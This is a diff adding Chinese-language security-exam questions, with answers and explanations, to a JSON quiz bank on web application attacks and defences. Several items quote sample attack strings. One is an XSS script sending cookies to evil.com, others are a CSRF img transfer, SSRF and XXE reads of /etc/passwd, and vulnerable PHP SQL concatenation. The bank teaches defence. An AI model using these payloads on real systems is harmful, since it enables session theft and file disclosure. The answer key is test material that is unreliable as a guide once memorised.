@@ -102,5 +102,125 @@
     "options": ["需修改应用代码", "应用无感知，引擎层加密", "只加密日志", "降低安全性"],
     "answer": 1,
     "explanation": "TDE(Transparent Data Encryption)在数据库引擎层加密，应用无感知，对查询透明。"
+  },
+  {
+    "id": "app-14",
+    "category": "application",
+    "question": "某电商网站的用户登录功能存在SQL注入漏洞，下列代码中哪行是漏洞根因？\n```php\n$name = $_POST['user'];\n$pwd = $_POST['pass'];\n$sql = \"SELECT * FROM users WHERE name='$name' AND pwd='$pwd'\";\n```\n",
+    "options": ["第1行接收POST参数", "第2行接收POST参数", "第3行将用户输入直接拼接进SQL", "以上都不是"],
+    "answer": 2,
+    "explanation": "场景题。漏洞根因在第3行：用户输入$name/$pwd未经处理直接拼入SQL语句。根因是'输入被当作SQL代码执行'，防护是参数化查询(用?占位符)。"
+  },
+  {
+    "id": "app-15",
+    "category": "application",
+    "question": "攻击者在评论框输入 `<script>document.location='http://evil.com?c='+document.cookie</script>`，该攻击属于？",
+    "options": ["存储型XSS", "反射型XSS", "CSRF", "SQL注入"],
+    "answer": 0,
+    "explanation": "场景题。评论存入数据库，他人访问评论页时脚本执行→存储型XSS。反射型需点击URL，CSRF借身份不发脚本，SQL注入是拼SQL。防护：输出编码。"
+  },
+  {
+    "id": "app-16",
+    "category": "application",
+    "question": "某银行转账接口为GET /transfer?to=123&amount=1000。攻击者在恶意页面嵌入 `<img src='/transfer?to=hacker&amount=10000'>`。这是什么攻击？",
+    "options": ["XSS", "CSRF", "SQL注入", "文件上传"],
+    "answer": 1,
+    "explanation": "场景题。用户已登录银行，访问恶意页面时<img>自动发起GET请求转账，借用户已登录身份→CSRF。防护：改POST+Anti-CSRF Token+SameSite Cookie。"
+  },
+  {
+    "id": "app-17",
+    "category": "application",
+    "question": "某Web应用需要同时防御SQL注入、XSS、CSRF三种攻击，下列防护组合正确的是？",
+    "options": ["输入过滤+输出编码+Token", "参数化查询+输出编码+Anti-CSRF Token", "WAF+HTTPS+防火墙", "加密+签名+哈希"],
+    "answer": 1,
+    "explanation": "综合题。SQL注入防参数化查询；XSS防输出编码；CSRF防Anti-CSRF Token。三者一一对应，不可混。输入过滤是辅助不是根本措施。"
+  },
+  {
+    "id": "app-18",
+    "category": "application",
+    "question": "某文件上传功能使用黑名单校验扩展名，禁止上传.php文件。攻击者上传了 .phtml 文件并成功执行。这说明？",
+    "options": ["黑名单不完整，应改用白名单", "文件大小限制不够", "目录权限错误", "使用了HTTPS"],
+    "answer": 0,
+    "explanation": "场景题。黑名单只禁了.php但漏了.phtml(也可执行PHP)。黑名单天然不完整，应改用白名单(只允许jpg/png等)。"
+  },
+  {
+    "id": "app-19",
+    "category": "application",
+    "question": "某应用的用户A通过修改URL参数 `?userid=100` 为 `?userid=101`，查看了用户B的订单。这属于？",
+    "options": ["垂直越权", "水平越权", "SQL注入", "XSS"],
+    "answer": 1,
+    "explanation": "场景题。同级用户互访数据→水平越权。垂直越权是低权限访问高权限功能(如普通用户进管理后台)。防护：每次操作校验当前用户是否有权访问该资源。"
+  },
+  {
+    "id": "app-20",
+    "category": "application",
+    "question": "某服务器接收用户输入的URL参数并直接发起请求：`fetch(url)`。攻击者传入 `url=file:///etc/passwd`。这属于什么漏洞？",
+    "options": ["SQL注入", "XSS", "SSRF", "CSRF"],
+    "answer": 2,
+    "explanation": "场景题。服务端发起请求时URL用户可控→SSRF(服务端请求伪造)。可读本地文件(file://)或访问内网。防护：白名单限制可访问的IP/域名，禁用file://等协议。"
+  },
+  {
+    "id": "app-21",
+    "category": "application",
+    "question": "某XML解析器接收外部XML数据，攻击者发送：`<!ENTITY xxe SYSTEM 'file:///etc/passwd'>`。该漏洞是？",
+    "options": ["SQL注入", "XXE", "XSS", "CSRF"],
+    "answer": 1,
+    "explanation": "场景题。XML外部实体(XXE)漏洞：解析器解析外部实体时读取本地文件。防护：禁用XML外部实体解析。"
+  },
+  {
+    "id": "app-22",
+    "category": "application",
+    "question": "某Java应用使用Fastjson反序列化用户传入的JSON数据，被攻击者利用执行了远程代码。该漏洞根因是？",
+    "options": ["JSON格式错误", "反序列化不可信数据", "未使用HTTPS", "口令太弱"],
+    "answer": 1,
+    "explanation": "场景题。反序列化不可信数据时可执行恶意代码(Fastjson/Log4j2/Struts2均属此类)。防护：不反序列化不可信数据，白名单限制可反序列化的类。"
+  },
+  {
+    "id": "app-23",
+    "category": "application",
+    "question": "某网站设置了 `X-Frame-Options: DENY`，该安全头的目的是？",
+    "options": ["防SQL注入", "防XSS", "防点击劫持", "防CSRF"],
+    "answer": 2,
+    "explanation": "概念题。X-Frame-Options: DENY禁止页面被iframe嵌入，防点击劫持(Clickjacking)。攻击者用透明iframe覆盖正常页面诱导用户点击。"
+  },
+  {
+    "id": "app-24",
+    "category": "application",
+    "question": "某企业数据库被拖库，50万条用户数据泄露。事后发现数据库账号拥有DBA权限。最有效的改进措施是？",
+    "options": ["更换数据库品牌", "数据库账号降为最小权限", "增加内存", "更换操作系统"],
+    "answer": 1,
+    "explanation": "场景题。DBA权限过大，SQL注入后攻击者可直接获取DBA权限拖库。应将应用账号降为最小权限(只授权必要的表和操作)，即使被注入也限制影响范围。"
+  },
+  {
+    "id": "app-25",
+    "category": "application",
+    "question": "某测试环境直接使用生产环境真实数据(含用户手机号)，安全评估指出问题。应采取的措施是？",
+    "options": ["限制测试人员访问", "数据脱敏后再用于测试", "加密测试环境网络", "增加审计日志"],
+    "answer": 1,
+    "explanation": "场景题。测试环境不应使用真实敏感数据，必须脱敏(替换/屏蔽/哈希)后再使用。防止测试环境泄露生产数据。"
+  },
+  {
+    "id": "app-26",
+    "category": "application",
+    "question": "某移动App与服务器通信使用HTTP明文传输，被中间人截获了用户token。下列改进方案最有效的是？",
+    "options": ["增加App端加密", "改用HTTPS(TLS)", "使用更长的token", "增加签名"],
+    "answer": 1,
+    "explanation": "场景题。HTTP明文传输可被窃听/篡改。改用HTTPS(TLS加密传输)是根本措施。App端加密不能解决传输安全(仍需TLS)。"
+  },
+  {
+    "id": "app-27",
+    "category": "application",
+    "question": "某云上应用部署在IaaS环境，用户负责的安全范围是？",
+    "options": ["仅数据安全", "应用+数据", "OS+应用+数据", "全部包括硬件"],
+    "answer": 2,
+    "explanation": "概念题。IaaS：云厂商管硬件/虚拟化，用户管OS+应用+数据。SaaS用户只管数据。数据安全始终用户负责。"
+  },
+  {
+    "id": "app-28",
+    "category": "application",
+    "question": "某IoT设备被Mirai僵尸网络感染，参与了大规模DDoS攻击。该僵尸网络主要利用什么感染设备？",
+    "options": ["漏洞利用", "默认弱口令", "钓鱼邮件", "物理接触"],
+    "answer": 1,
+    "explanation": "场景题。Mirai利用IoT设备未修改的默认弱口令批量感染。防：改默认口令、固件更新、网络隔离。"
   }
 ]
